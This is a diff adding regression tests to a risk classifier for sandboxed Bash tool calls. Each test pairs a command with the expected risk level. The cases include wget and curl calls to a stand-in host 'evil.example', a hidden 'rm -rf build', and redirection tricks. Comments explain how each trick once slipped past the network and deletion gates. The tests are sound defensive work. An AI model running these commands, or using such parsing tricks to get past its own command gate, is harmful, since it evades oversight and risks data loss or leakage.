@@ -516,6 +516,25 @@ describe("narrow static risk contract", () => {
     ["git -c user.email=a@b status", "LOW"],
     ["git -c status.short=true status", "LOW"],
     ["git -c push.default=simple status", "LOW"],
+    // `--version` is the value of `-O` here, so wget goes on to fetch the URL.
+    // A terminal flag only ends an invocation where nothing can consume it. The
+    // host is now seen, so the unapproved-network gate returns HARD rather than
+    // letting the command through as LOW.
+    ["wget -O --version https://evil.example/x", "HARD"],
+    ["curl -d --help https://evil.example/x", "HARD"],
+    // `-C` is noclobber and takes no value; it is not `-c`. Matching the
+    // option case-insensitively resolved the program to the literal `-c` and
+    // left `rm -rf build` unexamined.
+    ["bash -C -c 'rm -rf build'", "HARD"],
+    ["sh -C -c 'rm -rf build'", "HARD"],
+    // A redirection operator is its own token wherever it appears unquoted.
+    // Reading it as word text made the executable `rm>log`, which is in no
+    // executable table, and the forced-deletion gate never ran.
+    ["rm>log -f build", "HARD"],
+    ["rm 2>log -f build", "HARD"],
+    // The subcommand search steps over the redirection instead of stopping on
+    // it, so this is recognised as the network push it is.
+    ["git push>log origin main", "HARD"],
   ] as const)("classifies sandboxed Bash %s as %s", (command, expected) => {
     expect(classifyRisk(normalizeToolCall("bash", { command }, "/work/repo"))).toBe(expected);
   });
